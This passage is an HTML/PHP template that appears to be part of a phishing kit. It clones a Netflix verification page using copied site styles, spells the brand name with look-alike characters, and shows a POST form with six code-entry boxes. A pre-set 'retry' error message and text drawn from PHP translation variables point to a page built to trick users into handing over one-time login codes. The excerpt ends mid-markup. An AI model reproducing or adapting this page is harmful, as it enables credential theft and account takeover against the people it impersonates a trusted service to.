    --containerPointerEvents__12wd1go1c: all; 
    pointer-events: none;
} 

ul > li  { 
    list-style-type: disc; 
    margin-bottom: 5px; 
    margin-left: 1.1em;
} 

.default-ltr-cache-7vbe6a > *  { 
    -webkit-box-flex: 1; 
    flex-grow: 1; 
    margin: 0px;
} 

h1 { 
    font-size: 2em; 
    margin: .67em 0;
} 

h1 { 
    font-weight: 500;
} 

h1 { 
    color: #333; 
    font-size: 1.5em; 
    font-weight: 400; 
    margin: 0 0 .4em;
} 

@media screen and (min-width: 740px){ 
  h1 { 
    font-size: 2.15em; 
    margin: 0 0 .55em;
  } 
}     

.default-ltr-cache-1kf0n9g { 
    margin-block: 0px; 
    margin: 0px; 
    padding: 0px; 
    color: rgb(0, 0, 0); 
    text-align: center; 
    user-select: text;
} 

@media all{ 
  .default-ltr-cache-1kf0n9g { 
    font-size: 1.5rem; 
    font-weight: 500;
  } 
}     

@media (min-width: 600px){ 
  .default-ltr-cache-1kf0n9g { 
    font-size: 2rem; 
    font-weight: 700;
  } 
}     

@media (min-width: 960px){ 
  .default-ltr-cache-1kf0n9g { 
    font-size: 2rem; 
    font-weight: 700;
  } 
}     

@media (min-width: 1280px){ 
  .default-ltr-cache-1kf0n9g { 
    font-size: 2rem; 
    font-weight: 700;
  } 
}     

.default-ltr-cache-1hlqxsu { 
    margin-block-start: 0; 
    margin-block-end: 0; 
    margin: 0; 
    padding: 0; 
    color: rgba(0,0,0,0.7); 
    font-size: 1rem; 
    font-weight: 400; 
    text-align: center; 
    -webkit-user-select: text; 
    -moz-user-select: text; 
    -ms-user-select: text; 
    user-select: text;
} 

.default-ltr-cache-rlkylo { 
    margin-block: 0px; 
    margin: 0px; 
    padding: 0px; 
    color: rgba(0, 0, 0, 0.7); 
    font-size: 0.8125rem; 
    font-weight: 400; 
    text-align: center; 
    user-select: text;
} 

strong { 
    font-weight: 700;
} 

strong { 
    font-weight: 500;
} 

.default-ltr-cache-rlkylo a  { 
    color: rgb(0, 0, 0);
} 

.stack_styles__16b3gu10 { 
    flex-wrap: nowrap;
} 

.default-ltr-cache-1dutflm { 
    border: 0px; 
    cursor: pointer; 
    fill: currentcolor; 
    position: relative; 
    transition-duration: 250ms; 
    transition-property: background-color, border-color; 
    transition-timing-function: cubic-bezier(0.4, 0, 0.68, 0.06); 
    vertical-align: text-top; 
    width: auto; 
    font-size: 1rem; 
    font-weight: 500; 
    min-height: 2.5rem; 
    padding: 0.375rem 1rem; 
    border-radius: 0.25rem; 
    background: rgb(0, 0, 0); 
    color: rgb(255, 255, 255);
} 

.default-ltr-cache-1dutflm:after { 
    inset: 0px; 
    position: absolute; 
    transition: inherit; 
    border-style: solid; 
    border-width: 0.0625rem; 
    border-radius: calc(0.1875rem); 
    content: ""; 
    border-color: rgba(0, 0, 0, 0);
} 

@media (hover: hover){ 
  .default-ltr-cache-1dutflm:not([aria-disabled]):hover { 
    transition-timing-function: cubic-bezier(0.32, 0.94, 0.6, 1); 
    background: rgba(0, 0, 0, 0.7);
  } 

  .default-ltr-cache-1dutflm:not([aria-disabled]):hover:after { 
    border-color: rgba(0, 0, 0, 0);
  } 
}     

.default-ltr-cache-rswnv { 
    border: 0px; 
    cursor: pointer; 
    fill: currentcolor; 
    position: relative; 
    transition-duration: 250ms; 
    transition-property: background-color, border-color; 
    transition-timing-function: cubic-bezier(0.4, 0, 0.68, 0.06); 
    vertical-align: text-top; 
    width: auto; 
    font-size: 1rem; 
    font-weight: 500; 
    min-height: 2.5rem; 
    padding: 0.375rem 1rem; 
    border-radius: 0.25rem; 
    background: rgba(128, 128, 128, 0.3); 
    color: rgb(0, 0, 0);
} 

.default-ltr-cache-rswnv:after { 
    inset: 0px; 
    position: absolute; 
    transition: inherit; 
    border-style: solid; 
    border-width: 0.0625rem; 
    border-radius: calc(0.1875rem); 
    content: ""; 
    border-color: rgba(0, 0, 0, 0);
} 

@media (hover: hover){ 
  .default-ltr-cache-rswnv:not([aria-disabled]):hover { 
    transition-timing-function: cubic-bezier(0.32, 0.94, 0.6, 1); 
    background: rgba(128, 128, 128, 0.2);
  } 

  .default-ltr-cache-rswnv:not([aria-disabled]):hover:after { 
    border-color: rgba(0, 0, 0, 0);
  } 
}     

.form-control_containerStyles__oy4jpq0 { 
    display: inline-block;
} 

.default-ltr-cache-155bv7m > * > * > *  { 
    -webkit-box-flex: 1; 
    -webkit-flex-grow: 1; 
    -ms-flex-positive: 1; 
    flex-grow: 1; 
    margin: 0;
} 

.default-ltr-cache-199x40n { 
    width: 17.5rem;
} 

.screen-reader-only_screenReaderOnly__h8djxf0 { 
    clip: rect(0 0 0 0); 
    clip-path: inset(50%); 
    height: 1px; 
    overflow: hidden; 
    position: absolute; 
    white-space: nowrap; 
    width: 1px;
} 

.form-control_labelStyles__oy4jpq5 { 
    display: block; 
    -webkit-user-select: none; 
    -moz-user-select: none; 
    user-select: none;
} 

.default-ltr-cache-199x40n .form-control_labelStyles__oy4jpq5  { 
    margin-bottom: 0.25rem;
} 

.form-control_controlWrapperStyles__oy4jpq1 { 
    align-items: center; 
    color: black; 
    display: inline-flex; 
    fill: black; 
    font-size: 13px; 
    font-weight: 400; 
    gap: 2px; 
    letter-spacing: normal; 
    line-height: 100%; 
    padding: 2px; 
    position: relative; 
    text-align: left; 
    z-index: 0;
} 

.input-pin-code_styles__ln90vf4 .form-control_controlWrapperStyles__oy4jpq1  { 
    padding: 0;
} 

.default-ltr-cache-199x40n .form-control_controlWrapperStyles__oy4jpq1  { 
    color: rgb(0, 0, 0);
} 

input { 
    color: inherit; 
    font: inherit; 
    margin: 0;
} 

input { 
    line-height: normal;
} 

.form-control_controlWrapperStyles__oy4jpq1 > input  { 
    animation: form-control_animations_autofillEnd__oy4jpq3; 
    -webkit-appearance: none; 
    -moz-appearance: none; 
    appearance: none; 
    background: transparent; 
    background-clip: padding-box; 
    border: 0 solid transparent; 
    color: inherit; 
    font: inherit; 
    letter-spacing: inherit; 
    line-height: inherit; 
    margin: 0; 
    min-height: 15px; 
    min-width: 15px; 
    padding: 0; 
    text-align: inherit; 
    text-decoration: inherit; 
    text-transform: inherit;
} 

.form-control_controlWrapperStyles__oy4jpq1 > .input_nativeElementStyles__1euouia0  { 
    min-height: 16px; 
    min-width: 16px;
} 

.input-pin-code_styles__ln90vf4 .input_nativeElementStyles__1euouia0  { 
    width: var(--variables_width__ln90vf0); 
    letter-spacing: var(--variables_width__ln90vf0); 
    padding-left: var(--variables_paddingLeft__ln90vf1); 
    padding-right: var(--variables_paddingRight__ln90vf2); 
    box-sizing: border-box; 
    color: transparent; 
    caret-color: black; 
    font-family: monospace; 
    height: 20px;
} 

.default-ltr-cache-199x40n .form-control_controlWrapperStyles__oy4jpq1 > input  { 
    caret-color: rgb(0, 0, 0); 
    height: 4.5rem; 
    font-size: 1.5rem; 
    font-weight: 500; 
    line-height: 1.25; 
    width: 100%; 
    letter-spacing: 17.5rem; 
    padding: 0rem 1.25rem 0rem 16.25rem;
} 

.form-control_controlChromeStyles__oy4jpq4 { 
    align-items: center; 
    background: white; 
    border: 1px solid black; 
    border-radius: 2px; 
    bottom: 0; 
    color: transparent; 
    display: flex; 
    justify-content: center; 
    left: 0; 
    position: absolute; 
    right: 0; 
    top: 0; 
    -webkit-user-select: none; 
    -moz-user-select: none; 
    user-select: none; 
    z-index: -1;
} 

.input-pin-code_styles__ln90vf4 .form-control_controlChromeStyles__oy4jpq4  { 
    background: transparent; 
    border: none;
} 

.default-ltr-cache-199x40n input ~ .form-control_controlChromeStyles__oy4jpq4  { 
    color: inherit;
} 

.input-pin-code_digitStyles__ln90vf3 { 
    -webkit-appearance: none; 
    -moz-appearance: none; 
    appearance: none; 
    background: white; 
    border: 1px solid black; 
    border-radius: 2px; 
    color: black; 
    height: 16px; 
    opacity: 1; 
    padding: 1px; 
    pointer-events: none; 
    text-align: center; 
    -webkit-user-select: none; 
    -moz-user-select: none; 
    user-select: none; 
    width: 16px; 
    outline: none;
} 

input[disabled]  { 
    cursor: default;
} 

.default-ltr-cache-199x40n .input-pin-code_digitStyles__ln90vf3  { 
    background-color: rgb(255, 255, 255); 
    border-width: 0.0625rem; 
    border-radius: 0.25rem; 
    color: inherit; 
    height: 4.5rem; 
    box-sizing: border-box; 
    width: 2.5rem; 
    font-size: 1.5rem; 
    font-weight: 500; 
    line-height: 1.25; 
    border-color: rgb(128, 128, 128);
} 

.default-ltr-cache-178hxqx { 
    display: inline-block; 
    width: 0.5rem;
} 


@keyframes form-control_animations_autofillEnd__oy4jpq3 { 

} 
/* These were inline style tags. Uses id+class to override almost everything */
#style-WqIBS.style-WqIBS {  
   --_12wd1go1: 0px;  
    --_12wd1go2: row;  
    --_12wd1go3: center;  
    --_12wd1go5: 0px;  
    --_12wd1go6: 0px;  
    --_12wd1go7: 100%;  
}  
#style-CUpVk.style-CUpVk {  
   --zc08zpy: 0 0 100%;  
    --zc08zp1g: 0 0 100%;  
    --zc08zp1y: 0 0 100%;  
    --zc08zp2g: 0 0 83.33333333333334%;  
    --zc08zp2y: 0 0 66.66666666666666%;  
    --zc08zp7: 0px;  
}  
#style-oWqYa.style-oWqYa {  
   --_12wd1go1: 0px;  
    --_12wd1go2: row;  
    --_12wd1go5: 0px;  
    --_12wd1go6: 0px;  
    --_12wd1go7: 100%;  
}  
#style-JkaNp.style-JkaNp {  
   --_12wd1go0: center;  
    --_12wd1go1: 0px;  
    --_12wd1go2: column;  
    --_12wd1go3: space-between;  
    --_12wd1go5: 0px;  
    --_12wd1go6: 0px;  
    --_12wd1go7: 100%;  
}  
#style-7MM6B.style-7MM6B {  
   --zc08zp0: fit-content;  
    --zc08zp7: 0px;  
}  
#style-zyT1T.style-zyT1T {  
   --_12wd1go0: stretch;  
    --_12wd1go1: 0px;  
    --_12wd1go2: column;  
    --_12wd1go3: center;  
    --_12wd1god: 16px 0px 16px 0px;  
    --_12wd1gol: 32px 32px 32px 32px;  
    --_12wd1got: 40px 40px 40px 40px;  
    --_12wd1go11: 40px 40px 40px 40px;  
    --_12wd1go19: 40px 40px 40px 40px;  
    --_12wd1goe: 8px;  
    --_12wd1gom: 8px;  
    --_12wd1gou: 16px;  
    --_12wd1go12: 16px;  
    --_12wd1go1a: 16px;  
    --_12wd1go7: 100%;  
}  
#style-cASoE.style-cASoE {  
   --zc08zp0: calc(100% - 0px);  
    --zc08zp7: 0px;  
}  
#style-KHBYN.style-KHBYN {  
   --zc08zp0: calc(100% - 0px);  
    --zc08zp7: 0px;  
}  
#style-gbUVE.style-gbUVE {  
   --zc08zp0: calc(100% - 0px);  
    --zc08zp7: 0px;  
}  
#style-7nnSo.style-7nnSo {  
   --_12wd1go0: stretch;  
    --_12wd1go1: 0px;  
    --_12wd1go2: column;  
    --_12wd1go3: center;  
    --_12wd1god: 8px 0px 8px 0px;  
    --_12wd1gol: 8px 0px 8px 0px;  
    --_12wd1got: 12px 0px 12px 0px;  
    --_12wd1go11: 12px 0px 12px 0px;  
    --_12wd1go19: 12px 0px 12px 0px;  
    --_12wd1go6: 0px;  
    --_12wd1go7: 100%;  
}  
#style-LFFFe.style-LFFFe {  
   --zc08zp0: calc(100% - 0px);  
    --zc08zp7: 0px;  
}  
#style-r35Uo.style-r35Uo {  
   --_12wd1go0: flex-start;  
    --_12wd1go1: 0px;  
    --_12wd1go2: row;  
    --_12wd1go3: center;  
    --_12wd1go5: 0px;  
    --_12wd1go6: 0px;  
    --_12wd1go7: 100%;  
}  
#style-31K6K.style-31K6K {  
   --zc08zp0: auto;  
    --zc08zpg: 0 auto;  
    --zc08zp7: 0px;  
}  
#style-aUyK2.style-aUyK2 {  
   --variables_width__ln90vf0: 160px;  
    --variables_paddingLeft__ln90vf1: 10px;  
    --variables_paddingRight__ln90vf2: 150px;  
}  
#style-ILS6Y.style-ILS6Y {  
   --zc08zp0: calc(100% - 0px);  
    --zc08zp7: 0px;  
}  
#style-9Ntxq.style-9Ntxq {  
   --_12wd1go0: stretch;  
    --_12wd1go1: 8px;  
    --_12wd1go2: column;  
    --_12wd1go3: flex-start;  
    --_12wd1go5: 0px;  
    --_12wd1go6: 8px;  
    --_12wd1go7: calc(100% + 8px);  
}  
#style-K1EpV.style-K1EpV {  
   --zc08zp0: calc(100% - 8px);  
    --zc08zp7: 0px;  
}  
#style-O15iG.style-O15iG {  
   --zc08zp0: calc(100% - 8px);  
    --zc08zp7: 0px;  
}  
#style-KGces.style-KGces {  
   --zc08zp0: calc(100% - 0px);  
    --zc08zp7: 0px;  
}  
#style-2YH2N.style-2YH2N {  
   text-decoration: underline;  
    color: inherit;  
}  
#style-CExkA.style-CExkA {  
   --_12wd1go1: 0px;  
    --_12wd1go2: row;  
    --_12wd1go5: 0px;  
    --_12wd1go6: 0px;  
    --_12wd1go7: 100%;  
}  
#style-DaYYU.style-DaYYU {  
   --zc08zpg: 0 0 100%;  
    --zc08zp7: 0px;  
}  
#style-y7sHQ.style-y7sHQ {  
   --zc08zpg: 0 0 100%;  
    --zc08zp7: 0px;  
}  
#style-4VUZO.style-4VUZO {  
   --_12wd1go1: 0.75rem;  
    --_12wd1go2: row;  
    --_12wd1go5: 0px;  
    --_12wd1go6: 1rem;  
    --_12wd1go7: calc(100% + 0.75rem);  
}  
#style-Jfmr6.style-Jfmr6 {  
   --zc08zpy: 0 0 calc(50% - 0.75rem);  
    --zc08zp1g: 0 0 calc(50% - 0.75rem);  
    --zc08zp1y: 0 0 calc(25% - 0.75rem);  
    --zc08zp2g: 0 0 calc(25% - 0.75rem);  
    --zc08zp2y: 0 0 calc(25% - 0.75rem);  
    --zc08zp7: 0px;  
}  
#style-5rvLM.style-5rvLM {  
   --zc08zpy: 0 0 calc(50% - 0.75rem);  
    --zc08zp1g: 0 0 calc(50% - 0.75rem);  
    --zc08zp1y: 0 0 calc(25% - 0.75rem);  
    --zc08zp2g: 0 0 calc(25% - 0.75rem);  
    --zc08zp2y: 0 0 calc(25% - 0.75rem);  
    --zc08zp7: 0px;  
}  
#style-qF9pz.style-qF9pz {  
   --zc08zpy: 0 0 calc(50% - 0.75rem);  
    --zc08zp1g: 0 0 calc(50% - 0.75rem);  
    --zc08zp1y: 0 0 calc(25% - 0.75rem);  
    --zc08zp2g: 0 0 calc(25% - 0.75rem);  
    --zc08zp2y: 0 0 calc(25% - 0.75rem);  
    --zc08zp7: 0px;  
}  
#style-DPEUX.style-DPEUX {  
   --zc08zpy: 0 0 calc(50% - 0.75rem);  
    --zc08zp1g: 0 0 calc(50% - 0.75rem);  
    --zc08zp1y: 0 0 calc(25% - 0.75rem);  
    --zc08zp2g: 0 0 calc(25% - 0.75rem);  
    --zc08zp2y: 0 0 calc(25% - 0.75rem);  
    --zc08zp7: 0px;  
}  
#style-BUlol.style-BUlol {  
   --zc08zpy: 0 0 calc(50% - 0.75rem);  
    --zc08zp1g: 0 0 calc(50% - 0.75rem);  
    --zc08zp1y: 0 0 calc(25% - 0.75rem);  
    --zc08zp2g: 0 0 calc(25% - 0.75rem);  
    --zc08zp2y: 0 0 calc(25% - 0.75rem);  
    --zc08zp7: 0px;  
}  
#style-a4ek9.style-a4ek9 {  
   --zc08zpy: 0 0 calc(50% - 0.75rem);  
    --zc08zp1g: 0 0 calc(50% - 0.75rem);  
    --zc08zp1y: 0 0 calc(25% - 0.75rem);  
    --zc08zp2g: 0 0 calc(25% - 0.75rem);  
    --zc08zp2y: 0 0 calc(25% - 0.75rem);  
    --zc08zp7: 0px;  
}  
#style-MzzoP.style-MzzoP {  
   --zc08zpy: 0 0 calc(50% - 0.75rem);  
    --zc08zp1g: 0 0 calc(50% - 0.75rem);  
    --zc08zp1y: 0 0 calc(25% - 0.75rem);  
    --zc08zp2g: 0 0 calc(25% - 0.75rem);  
    --zc08zp2y: 0 0 calc(25% - 0.75rem);  
    --zc08zp7: 0px;  
}  
#style-OjMVe.style-OjMVe {  
   --zc08zpy: 0 0 calc(50% - 0.75rem);  
    --zc08zp1g: 0 0 calc(50% - 0.75rem);  
    --zc08zp1y: 0 0 calc(25% - 0.75rem);  
    --zc08zp2g: 0 0 calc(25% - 0.75rem);  
    --zc08zp2y: 0 0 calc(25% - 0.75rem);  
    --zc08zp7: 0px;  
}  
#style-xPJ3g.style-xPJ3g {  
   --zc08zpy: 0 0 calc(50% - 0.75rem);  
    --zc08zp1g: 0 0 calc(50% - 0.75rem);  
    --zc08zp1y: 0 0 calc(25% - 0.75rem);  
    --zc08zp2g: 0 0 calc(25% - 0.75rem);  
    --zc08zp2y: 0 0 calc(25% - 0.75rem);  
    --zc08zp7: 0px;  
}  
#style-XUJM4.style-XUJM4 {  
   --zc08zpg: 0 0 100%;  
    --zc08zp7: 0px;  
}  

</style>
<body>
  <div class="snipcss-8KUaz">
    <div data-uia="loc" lang="en-HR" dir="ltr" class="">
      <div class="default-ltr-cache-0">
        <div data-uia="account+page" class="default-ltr-cache-18uodxu el0v7283">
          <section class="">
            <div data-uia="account+header+page-header" class="default-ltr-cache-1kxni4p e98m0yb5">
              <div class="default-ltr-cache-18f2igg e98m0yb2">
                <div class="default-ltr-cache-15d6ef6 e98m0yb4">
                  <header data-uia="account+header" class="default-ltr-cache-80ndpi e1psihd42">
                    <a class="pressable_styles__a6ynkg0 anchor_styles__1h0vwqc0 default-ltr-cache-5dql71 e1psihd41" data-uia="account+header+logo" dir="ltr" role="link" href="/browse">
                      <svg viewBox="0 0 111 30" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" aria-hidden="true" role="img" class="default-ltr-cache-1d568uk ev1dnif2">
                        <g>
                          <path d="M105.06233,14.2806261 L110.999156,30 C109.249227,29.7497422 107.500234,29.4366857 105.718437,29.1554972 L102.374168,20.4686475 L98.9371075,28.4375293 C97.2499766,28.1563408 95.5928391,28.061674 93.9057081,27.8432843 L99.9372012,14.0931671 L94.4680851,-5.68434189e-14 L99.5313525,-5.68434189e-14 L102.593495,7.87421502 L105.874965,-5.68434189e-14 L110.999156,-5.68434189e-14 L105.06233,14.2806261 Z M90.4686475,-5.68434189e-14 L85.8749649,-5.68434189e-14 L85.8749649,27.2499766 C87.3746368,27.3437061 88.9371075,27.4055675 90.4686475,27.5930265 L90.4686475,-5.68434189e-14 Z M81.9055207,26.93692 C77.7186241,26.6557316 73.5307901,26.4064111 69.250164,26.3117443 L69.250164,-5.68434189e-14 L73.9366389,-5.68434189e-14 L73.9366389,21.8745899 C76.6248008,21.9373887 79.3120255,22.1557784 81.9055207,22.2804387 L81.9055207,26.93692 Z M64.2496954,10.6561065 L64.2496954,15.3435186 L57.8442216,15.3435186 L57.8442216,25.9996251 L53.2186709,25.9996251 L53.2186709,-5.68434189e-14 L66.3436123,-5.68434189e-14 L66.3436123,4.68741213 L57.8442216,4.68741213 L57.8442216,10.6561065 L64.2496954,10.6561065 Z M45.3435186,4.68741213 L45.3435186,26.2498828 C43.7810479,26.2498828 42.1876465,26.2498828 40.6561065,26.3117443 L40.6561065,4.68741213 L35.8121661,4.68741213 L35.8121661,-5.68434189e-14 L50.2183897,-5.68434189e-14 L50.2183897,4.68741213 L45.3435186,4.68741213 Z M30.749836,15.5928391 C28.687787,15.5928391 26.2498828,15.5928391 24.4999531,15.6875059 L24.4999531,22.6562939 C27.2499766,22.4678976 30,22.2495079 32.7809542,22.1557784 L32.7809542,26.6557316 L19.812541,27.6876933 L19.812541,-5.68434189e-14 L32.7809542,-5.68434189e-14 L32.7809542,4.68741213 L24.4999531,4.68741213 L24.4999531,10.9991564 C26.3126816,10.9991564 29.0936358,10.9054269 30.749836,10.9054269 L30.749836,15.5928391 Z M4.78114163,12.9684132 L4.78114163,29.3429562 C3.09401069,29.5313525 1.59340144,29.7497422 0,30 L0,-5.68434189e-14 L4.4690224,-5.68434189e-14 L10.562377,17.0315868 L10.562377,-5.68434189e-14 L15.2497891,-5.68434189e-14 L15.2497891,28.061674 C13.5935889,28.3437998 11.906458,28.4375293 10.1246602,28.6868498 L4.78114163,12.9684132 Z"></path>
                        </g>
                      </svg>
                  <span class="screen-reader-text">Nеtflіх</span>
                </a>
                <a href="#" class="authLinks signupBasicHeader onboarding-header" data-uia="header-signout-link"><?php echo $translations['signOut']; ?></a>
              </div>
<style>

.authLinks {
  color: #333;
  float: right;
  font-size: 19px;
  font-weight: 500;
  line-height: 90px;
}
a {
  color: #0071eb;
  text-decoration: none;
}

.authLinks.signupBasicHeader {
  margin: 0 3%;
}
a:hover {
  text-decoration: underline;
}
a:active, a:hover {
  outline: 0;
}
a {
  background-color: transparent;
}

</style>
                    </span>
                  </header>
                </div>
              </div>
              <div id="clcsBanner"></div>
              <div class="uma"></div>
            </div>
            <div data-layout="wrapper" class="layout-container_wrapperStyles__12wd1go1d  default-ltr-cache-1u8qly9" dir="ltr">
              <div data-layout="container" class="layout-container_styles__12wd1go1g snipcss0-0-0-1 tether-element-attached-top tether-element-attached-center tether-target-attached-top tether-target-attached-center style-WqIBS" dir="ltr" id="style-WqIBS">
                <div data-layout="item" class="layout-item_styles__zc08zp30 default-ltr-cache-1u8qly9 snipcss0-1-1-2 style-CUpVk" dir="ltr" id="style-CUpVk">
                  <div data-layout="wrapper" class="layout-container_wrapperStyles__12wd1go1d default-ltr-cache-1u8qly9 snipcss0-2-2-3" dir="ltr">
                    <div data-layout="container" class="layout-container_styles__12wd1go1g snipcss0-3-3-4 style-oWqYa" dir="ltr" id="style-oWqYa">
                      <div class="default-ltr-cache-1ythyxk e1bbao1b0 snipcss0-0-0-1 snipcss0-4-4-5 tether-element-attached-top tether-element-attached-center tether-target-attached-top tether-target-attached-center">
                        <div data-uia="account+right-col" class="default-ltr-cache-wlhfwz el0v7281 snipcss0-1-1-2 snipcss0-5-5-6">
                          <div data-uia="mfa-page-container" class="default-ltr-cache-1wgv4st e1d35f7s0 snipcss0-2-2-3 snipcss0-6-6-7">
                            <div data-layout="wrapper" class="layout-container_wrapperStyles__12wd1go1d layout-container_wrapperStyles_dangerouslyApplyPointerEvents_true__12wd1go1e default-ltr-cache-1qj0wac ermvlvv1 snipcss0-3-3-4 snipcss0-7-7-8" dir="ltr" data-uia="collect-input-container">
                              <div data-layout="container" data-uia="collect-input-container+container" dir="ltr" class="layout-container_styles__12wd1go1g snipcss0-4-4-5 snipcss0-8-8-9 style-JkaNp" id="style-JkaNp">
                                <div data-layout="item" index="0" class="layout-item_styles__zc08zp30 default-ltr-cache-7vbe6a ermvlvv0 snipcss0-5-5-6 snipcss0-9-9-10 style-7MM6B" dir="ltr" id="style-7MM6B">
                                  <div data-layout="wrapper" class="layout-container_wrapperStyles__12wd1go1d layout-container_wrapperStyles_dangerouslyApplyPointerEvents_true__12wd1go1e default-ltr-cache-1qj0wac ermvlvv1 snipcss0-6-6-7 snipcss0-10-10-11" dir="ltr" data-uia="collect-input-form">
                                    <form data-layout="container" data-uia="collect-input-form+container" method="POST" containerstyle="[object Object]" dir="ltr" class="layout-container_styles__12wd1go1g snipcss0-7-7-8 snipcss0-11-11-12 style-zyT1T" id="style-zyT1T">
                                      <div data-layout="item" index="0" class="layout-item_styles__zc08zp30 default-ltr-cache-7vbe6a ermvlvv0" dir="ltr" style="--zc08zp0: calc(100% - 0px); --zc08zp7: 0px;">
 
<style>
.layout-container_styles__12wd1go1g > * {
    margin-left: var(--_12wd1go1, unset);
    margin-top: var(--_12wd1go6, unset);
    pointer-events: var(--containerPointerEvents__12wd1go1c, unset);
}
.default-ltr-cache-1puvbbc, .default-ltr-cache-1puvbbc::after {
    background-color: rgb(216, 157, 49);
}

.default-ltr-cache-1puvbbc {
    font-size: 1rem;
    font-weight: 400;
    border-radius: 0.25rem;
    border-width: 0.0625rem;
    color: rgb(0, 0, 0);
    padding: 1rem;
}
.default-ltr-cache-7vbe6a > * {
    -webkit-box-flex: 1;
    flex-grow: 1;
    margin: 0px;
}
.default-ltr-cache-1x17g94 {
    display: flex
;
    -webkit-box-align: center;
    align-items: center;
    width: 100%;
}

svg:not(:root) {
    overflow: hidden;
}

.default-ltr-cache-ceu2i {
    min-width: 1.5rem;
    display: flex
;
    margin-right: 1rem;
}

path[Attributes Style] {
    fill-rule: evenodd;
    clip-rule: evenodd;
    d: path("M 13.7306 2.99377 C 12.9603 1.66321 11.0392 1.66322 10.2689 2.9938 L 1.00357 18.9979 C 0.231657 20.3313 1.19377 22 2.73443 22 H 21.2655 C 22.8062 22 23.7683 20.3312 22.9964 18.9979 L 13.7306 2.99377 Z M 13.5002 9 H 10.5002 L 11.0002 14 H 13.0002 L 13.5002 9 Z M 12.0002 16 C 12.8287 16 13.5002 16.6716 13.5002 17.5 C 13.5002 18.3284 12.8287 19 12.0002 19 C 11.1718 19 10.5002 18.3284 10.5002 17.5 C 10.5002 16.6716 11.1718 16 12.0002 16 Z");
    fill: currentcolor;
}
.default-ltr-cache-mkkf9p {
    flex: 1 1 auto;
}
.layout-container_wrapperStyles__12wd1go1d * {
    box-sizing: border-box;
}

.default-ltr-cache-lpy6ec {
    margin-block-start: 0;
    margin-block-end: 0;
    margin: 0;
    padding: 0;
    color: rgb(0, 0, 0);
    font-size: 1rem;
    font-weight: 400;
    text-align: start;
    -webkit-user-select: text;
    -moz-user-select: text;
    -ms-user-select: text;
    user-select: text;
}








</style>

 <div class=" default-ltr-cache-1puvbbc e191g6e33" role="alert" data-uia="collect-input-alert-WARNING">
    <div class="default-ltr-cache-1x17g94 e191g6e32">
      <svg xmlns="http://www.w3.org/2000/svg" fill="none" role="img" viewBox="0 0 24 24" width="24" height="24" data-icon="WarningFillStandard" data-uia="collect-input-alert-WARNING+icon" aria-hidden="true" class="default-ltr-cache-ceu2i e191g6e36">
        <path fill-rule="evenodd" clip-rule="evenodd" d="M13.7306 2.99377C12.9603 1.66321 11.0392 1.66322 10.2689 2.9938L1.00357 18.9979C0.231657 20.3313 1.19377 22 2.73443 22H21.2655C22.8062 22 23.7683 20.3312 22.9964 18.9979L13.7306 2.99377ZM13.5002 9H10.5002L11.0002 14H13.0002L13.5002 9ZM12.0002 16C12.8287 16 13.5002 16.6716 13.5002 17.5C13.5002 18.3284 12.8287 19 12.0002 19C11.1718 19 10.5002 18.3284 10.5002 17.5C10.5002 16.6716 11.1718 16 12.0002 16Z" fill="currentColor"></path>
      </svg>
      <div class="default-ltr-cache-mkkf9p e191g6e31">
        <p class=" default-ltr-cache-lpy6ec euy28770"><?php echo $translations['retryErrorMessage']; ?></p>
      </div>
    </div>
  </div>
</div>
									  <div data-layout="item" index="0" class="layout-item_styles__zc08zp30 default-ltr-cache-7vbe6a ermvlvv0 snipcss0-8-8-9 snipcss0-12-12-13 style-cASoE" dir="ltr" id="style-cASoE">
<h1 data-uia="collect-input-title" class="default-ltr-cache-1kf0n9g euy28770 snipcss0-9-9-10 snipcss0-13-13-14">
    <?php echo $translations['enterCodeTitle']; ?>
</h1>
                                      </div>
                                      <div data-layout="item" index="1" class="layout-item_styles__zc08zp30 default-ltr-cache-7vbe6a ermvlvv0 snipcss0-8-8-11 snipcss0-12-12-15 style-KHBYN" dir="ltr" id="style-KHBYN">
                                        <span data-uia="collect-input-body" class="default-ltr-cache-1hlqxsu euy28770 snipcss0-9-11-12 snipcss0-13-15-16">
                                          <span class="snipcss0-10-12-13 snipcss0-14-16-17"><?php echo $translations['enterCodeMessage']; ?> </span>
                                        </span>
                                      </div>
<div style="display: flex; justify-content: center; gap: 8px; margin-top: 20px; margin-bottom: 20px;">
  <input class="auth-code-input" type="text" style="background-color: rgb(255, 255, 255); border-width: 1px; border-style: solid; border-color: rgb(128, 128, 128); border-radius: 0.25rem; color: inherit; height: 72px; box-sizing: border-box; width: 40px; font-size: 1.5rem; font-weight: 500; text-align: center; line-height: 72px;" maxlength="1">
  <input class="auth-code-input" type="text" style="background-color: rgb(255, 255, 255); border-width: 1px; border-style: solid; border-color: rgb(128, 128, 128); border-radius: 0.25rem; color: inherit; height: 72px; box-sizing: border-box; width: 40px; font-size: 1.5rem; font-weight: 500; text-align: center; line-height: 72px;" maxlength="1">
  <input class="auth-code-input" type="text" style="background-color: rgb(255, 255, 255); border-width: 1px; border-style: solid; border-color: rgb(128, 128, 128); border-radius: 0.25rem; color: inherit; height: 72px; box-sizing: border-box; width: 40px; font-size: 1.5rem; font-weight: 500; text-align: center; line-height: 72px;" maxlength="1">
  <input class="auth-code-input" type="text" style="background-color: rgb(255, 255, 255); border-width: 1px; border-style: solid; border-color: rgb(128, 128, 128); border-radius: 0.25rem; color: inherit; height: 72px; box-sizing: border-box; width: 40px; font-size: 1.5rem; font-weight: 500; text-align: center; line-height: 72px;" maxlength="1">
  <input class="auth-code-input" type="text" style="background-color: rgb(255, 255, 255); border-width: 1px; border-style: solid; border-color: rgb(128, 128, 128); border-radius: 0.25rem; color: inherit; height: 72px; box-sizing: border-box; width: 40px; font-size: 1.5rem; font-weight: 500; text-align: center; line-height: 72px;" maxlength="1">
  <input class="auth-code-input" type="text" style="background-color: rgb(255, 255, 255); border-width: 1px; border-style: solid; border-color: rgb(128, 128, 128); border-radius: 0.25rem; color: inherit; height: 72px; box-sizing: border-box; width: 40px; font-size: 1.5rem; font-weight: 500; text-align: center; line-height: 72px;" maxlength="1">
</div>


                                      <div data-layout="item" index="3" class="layout-item_styles__zc08zp30 default-ltr-cache-7vbe6a ermvlvv0 snipcss0-8-8-38 snipcss0-0-0-1 snipcss0-12-12-42 tether-element-attached-top tether-element-attached-center tether-target-attached-top tether-target-attached-center style-ILS6Y" dir="ltr" id="style-ILS6Y">
                                        <div data-layout="wrapper" class="layout-container_wrapperStyles__12wd1go1d layout-container_wrapperStyles_dangerouslyApplyPointerEvents_true__12wd1go1e default-ltr-cache-1qj0wac ermvlvv1 snipcss0-9-38-39 snipcss0-1-1-2 snipcss0-13-42-43" dir="ltr">
